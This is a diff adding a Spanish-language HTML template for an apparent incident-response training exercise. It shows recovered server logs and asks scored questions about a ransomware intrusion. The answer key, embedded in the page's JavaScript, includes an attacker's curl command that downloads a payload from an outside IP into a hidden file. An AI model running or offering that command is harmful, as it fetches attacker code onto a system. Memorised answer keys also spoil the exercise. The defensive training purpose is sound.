@@ -1,0 +1,110 @@
+{% extends 'base.html' %}
+
+{% block title %}Evidence — Shadow IT{% endblock %}
+
+{% block content %}
+
+<div class="logs-header">
+    <div class="logs-meta">
+        <span class="logs-badge">// SHADOW IT — LOGS CRUDOS</span>
+        <span class="logs-count" style="color: var(--red);">⚠ Servidor sin agente SIEM</span>
+    </div>
+    <h1>Evidencia Forense — SRV-BACKUP01</h1>
+    <p class="subtitle">Este servidor no tenía agente Wazuh instalado. Logs recuperados manualmente de backup.</p>
+</div>
+
+<div class="alert-box">
+    <span class="alert-icon">⚠</span>
+    <span>Estos logs NO están en tu SIEM. Fueron recuperados manualmente del servidor de backup. Analízalos con atención — contienen la actividad del atacante en un sistema que nadie monitorizaba.</span>
+</div>
+
+<div class="shadow-toolbar">
+    <input type="text" id="grep-input" placeholder="Buscar en los logs (grep manual)..." class="filtro-input" oninput="grepLogs()" style="width:100%">
+</div>
+
+<div class="evidence-box">
+    <div class="evidence-header">
+        <span class="evidence-filename">📄 srv-backup01-raw.log</span>
+        <span class="evidence-size">Recuperado de /var/log/syslog</span>
+    </div>
+    <div class="evidence-content" id="evidence-content">
+        {% for linea in contenido.split('\n') %}
+        <div class="log-line {% if '185.220.101.47' in linea or 'hidden' in linea or 'encryption' in linea or 'exfil' in linea %}line-suspicious{% elif linea.startswith('#') %}line-comment{% endif %}" data-content="{{ linea }}">
+            <span class="line-num">{{ loop.index }}</span>
+            <span class="line-text">{{ linea }}</span>
+        </div>
+        {% endfor %}
+    </div>
+</div>
+
+<div class="shadow-objectives">
+    <h2>Preguntas de análisis manual</h2>
+    <div class="objectives-list">
+        <div class="objective-card">
+            <div class="obj-header">
+                <span class="obj-id">SHADOW-001</span>
+                <span class="obj-pts">300 pts</span>
+                <span class="obj-cat">Shadow IT</span>
+            </div>
+            <p class="obj-pregunta">¿Qué comando usó el atacante para descargar el payload en SRV-BACKUP01?</p>
+            <div class="obj-form" id="form-SHADOW-001">
+                <input type="text" id="input-SHADOW-001" placeholder="Tu respuesta..." class="obj-input">
+                <button class="obj-btn" onclick="enviarShadow('SHADOW-001', 'curl -s http://185.220.101.47/payload.sh -o /tmp/.hidden_update')">Enviar</button>
+            </div>
+            <div class="obj-feedback" id="feedback-SHADOW-001"></div>
+        </div>
+
+        <div class="objective-card">
+            <div class="obj-header">
+                <span class="obj-id">SHADOW-002</span>
+                <span class="obj-pts">350 pts</span>
+                <span class="obj-cat">Shadow IT</span>
+            </div>
+            <p class="obj-pregunta">¿Cuántos archivos fueron cifrados en SRV-BACKUP01?</p>
+            <div class="obj-form" id="form-SHADOW-002">
+                <input type="text" id="input-SHADOW-002" placeholder="Tu respuesta..." class="obj-input">
+                <button class="obj-btn" onclick="enviarShadow('SHADOW-002', '847')">Enviar</button>
+            </div>
+            <div class="obj-feedback" id="feedback-SHADOW-002"></div>
+        </div>
+    </div>
+</div>
+
+<div class="logs-back">
+    <a href="/scenario/{{ scenario_id }}" class="btn-back">← Volver al escenario</a>
+</div>
+
+<script>
+function grepLogs() {
+    const busqueda = document.getElementById('grep-input').value.toLowerCase();
+    const lineas = document.querySelectorAll('.log-line');
+    lineas.forEach(linea => {
+        if (busqueda === '' || linea.dataset.content.toLowerCase().includes(busqueda)) {
+            linea.style.display = '';
+        } else {
+            linea.style.display = 'none';
+        }
+    });
+}
+
+function enviarShadow(objId, flag) {
+    const input = document.getElementById('input-' + objId);
+    const feedback = document.getElementById('feedback-' + objId);
+    const respuesta = input.value.trim();
+
+    if (!respuesta) return;
+
+    const correcta = respuesta === flag;
+    feedback.textContent = correcta
+        ? '¡Correcto! +' + (objId === 'SHADOW-001' ? '300' : '350') + ' puntos'
+        : 'Incorrecto. Revisa los logs con más detalle.';
+    feedback.className = 'obj-feedback ' + (correcta ? 'correcto' : 'incorrecto');
+
+    if (correcta) {
+        input.disabled = true;
+        document.querySelector('#form-' + objId + ' .obj-btn').disabled = true;
+    }
+}
+</script>
+
+{% endblock %}
